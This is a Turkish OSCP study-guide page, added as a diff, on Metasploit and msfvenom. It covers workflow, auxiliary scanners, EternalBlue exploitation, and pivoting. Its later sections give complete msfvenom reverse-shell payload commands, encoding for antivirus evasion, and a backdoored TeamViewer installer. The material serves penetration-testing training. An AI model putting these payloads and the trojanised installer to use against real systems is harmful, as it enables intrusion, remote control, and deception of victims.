@@ -1,0 +1,174 @@
+---
+layout: page
+title: "Bölüm 15 — Metasploit & msfvenom"
+oscp: true
+toc: true
+permalink: /oscp/15-metasploit/
+---
+
+{% raw %}
+Bu bölüm, Metasploit Framework (MSF) ve payload üreticisi msfvenom'u kapsar.
+Kural: **MSF bir muhafız değil, bir çarpandır** — enum, exploit, pivot ve post'u
+hızlandırır ama ne yaptığını bilmeden kullanma. Bir modülü çalıştırmadan önce
+`info` ve `show options` ile ne yaptığını oku.
+
+> **OSCP sınav kısıtı:** Metasploit **tüm sınav makinelerinde değil, yalnızca bir
+> makinede** (ve `check`/exploit/post'u sınırlı) kullanılabilir; `msfvenom`,
+> `pattern_create` gibi yardımcılar serbesttir. Bu yüzden her tekniğin **manuel**
+> karşılığını da bil ([Bölüm 4/5/7](/oscp/04-windows-privesc/)).
+
+## 15.1 Modül & Payload Mantığı
+
+- **exploit / auxiliary / post / encoder / nop / payload** modül türleri.
+- **Staged payload** (`windows/meterpreter/reverse_tcp`): iki parça — önce küçük
+  *stager* bağlanır, sonra *stage*'i indirir. **Non-staged** (`..._reverse_tcp` →
+  `meterpreter_reverse_tcp`): tek parça, hepsi birden gider; firewall/pivot'ta daha
+  güvenilir. Payload adındaki `/` staged, `_` non-staged ayrımını verir.
+- **Meterpreter:** bellekte çalışan, dosya sistemi/keylog/pivot yetenekli gelişmiş
+  payload; tespiti zordur.
+
+## 15.2 Veritabanı & Workspace
+
+```bash
+sudo systemctl start postgresql
+sudo msfdb init                     # veritabanını kur
+msfconsole -q
+msf6> db_status
+msf6> workspace -a htb-lab          # ekle   / -d sil / -r eski yeni (rename)
+msf6> workspace htb-lab             # geçiş
+
+# Nmap sonucunu içe al VEYA MSF içinden tara (otomatik db'ye yazar)
+msf6> db_import scan.xml            # nmap -oX scan.xml ... çıktısı
+msf6> db_nmap 10.129.1.5 -Pn -sVC -p- -O
+msf6> hosts          # keşfedilen hostlar + OS
+msf6> services       # port/servis tablosu
+msf6> vulns          # tespit edilen zafiyetler
+msf6> creds          # toplanan kimlik bilgileri
+msf6> loot           # dump'lanan hash/dosyalar
+```
+
+## 15.3 Temel Akış
+
+```bash
+msf6> search cve:2021 type:exploit platform:windows   # - ile hariç tut
+msf6> use exploit/windows/smb/ms17_010_eternalblue
+msf6> info                          # ne yaptığını oku
+msf6> show options                  # gerekli RHOSTS/LHOST/...
+msf6> set RHOSTS 10.129.1.5
+msf6> set LHOST tun0
+msf6> check                         # (destekliyorsa) exploit etmeden doğrula
+msf6> run                           # veya exploit -j (job olarak arka planda)
+msf6> sessions -l                   # açık oturumlar
+msf6> sessions -i 1                 # oturuma gir
+```
+
+## 15.4 Auxiliary ile Enum
+
+Servis bazlı enum/brute için auxiliary tarayıcılar ([Bölüm 11](/oscp/11-servis-enumerasyon/)'in otomatik hali):
+
+```text
+auxiliary/scanner/portscan/tcp            # pivot içindeki iç ağı tara
+auxiliary/scanner/smb/smb_enumshares      # SMB paylaşımları
+auxiliary/scanner/ftp/ftp_version|ftp_login
+auxiliary/scanner/ssh/ssh_enumusers       # kullanıcı enum (timing/malformed)
+auxiliary/scanner/smtp/smtp_enum          # → bulunan kullanıcılarla tekrar brute
+auxiliary/scanner/mysql/mysql_login|mysql_hashdump|mysql_schemadump
+auxiliary/scanner/http/http_version|dir_scanner|http_put|robots_txt
+```
+
+**WMAP (web enum):**
+
+```bash
+msf6> load wmap
+msf6> wmap_sites -a http://TARGET
+msf6> wmap_targets -t http://TARGET
+msf6> wmap_run -t          # uygun modülleri listele
+msf6> wmap_run -e          # çalıştır
+msf6> wmap_vulns -l
+```
+
+## 15.5 Post & Pivoting
+
+```bash
+# Hangi yerel exploit uyar? (meterpreter oturumundan)
+meterpreter> background
+msf6> use post/multi/recon/local_exploit_suggester
+msf6> set SESSION 1 ; run
+
+# Pivot: ele geçirilen host üzerinden iç ağa route
+meterpreter> run autoroute -s 192.168.20.0/24
+meterpreter> background
+msf6> route                                    # route tablosu
+msf6> use auxiliary/scanner/portscan/tcp       # artık iç ağı tarar
+# SOCKS proxy (proxychains ile dışarı araçları da yönlendir)
+msf6> use auxiliary/server/socks_proxy
+```
+
+> Pivoting'in manuel (ssh/chisel/ligolo) karşılıkları için
+> [Bölüm 8 — Pivoting & Tünelleme](/oscp/08-pivoting/).
+
+## 15.6 msfvenom — Payload Üretimi
+
+```bash
+msfvenom --list payloads ; msfvenom --list formats ; msfvenom --list encoders
+
+# Windows exe (staged meterpreter)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f exe -o shell.exe
+# Linux ELF
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f elf -o shell.elf
+# Web payload'ları
+msfvenom -p php/reverse_php LHOST=tun0 LPORT=443 -f raw -o shell.php
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=443 -f war -o shell.war
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f aspx -o shell.aspx
+```
+
+**Dinleyici (multi/handler):**
+
+```bash
+msf6> use exploit/multi/handler
+msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6> set LHOST tun0 ; set LPORT 443 ; run -j
+```
+
+## 15.7 Encoding & Backdoorlu Binary (AV)
+
+```bash
+# Encode (iterasyon ↑ → AV kaçışı ↑; 10'dan sonrası genelde işe yaramaz)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 \
+  -e x86/shikata_ga_nai -i 10 -f exe -o enc.exe
+
+# Meşru exe'ye göm (-x template, -k ayrı thread'de orijinali de çalıştır)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 \
+  -e x86/shikata_ga_nai -i 5 -k -x ~/Downloads/TeamViewer_Setup.exe \
+  -a x86 --platform windows -o TeamViewer_Setup.exe
+```
+
+> `-k` dosyanın işlevselliğini korur ama bazen payload'ı bozar; `-k`'siz
+> daha stabil. shikata_ga_nai modern AV'yi tek başına atlatmaz — gerçek kaçış için
+> `shellter`, özel runner veya obfuscation ([Bölüm 9](/oscp/09-istemci-av/)). Çift
+> RAR'lama (uzantı silme) VirusTotal dışında bir anlam taşımaz, sadece transfer/arşiv
+> numarasıdır.
+
+## 15.8 Otomasyon (resource script)
+
+```bash
+# handler.rc — sırayla komutlar
+#   use exploit/multi/handler
+#   set PAYLOAD windows/x64/meterpreter/reverse_tcp
+#   set LHOST tun0 ; set LPORT 443 ; run
+msfconsole -r handler.rc
+# MSF içinden:
+msf6> resource /path/handler.rc
+msf6> makerc /path/session.rc        # yaptıklarını script'e döker
+```
+
+Hazır script'ler: `/usr/share/metasploit-framework/scripts/resource/`.
+
+---
+
+Meterpreter oturumu aldıktan sonra credential/loot için
+[Bölüm 16 — Post-Exploitation & Looting](/oscp/16-post-exploitation/),
+AD ortamıysa [Bölüm 7](/oscp/07-ad-saldirilari/)'ye geç.
+
+[← Bölüm 14](/oscp/14-yaygin-uygulamalar/) · [Bölüm 16 →](/oscp/16-post-exploitation/)
+{% endraw %}
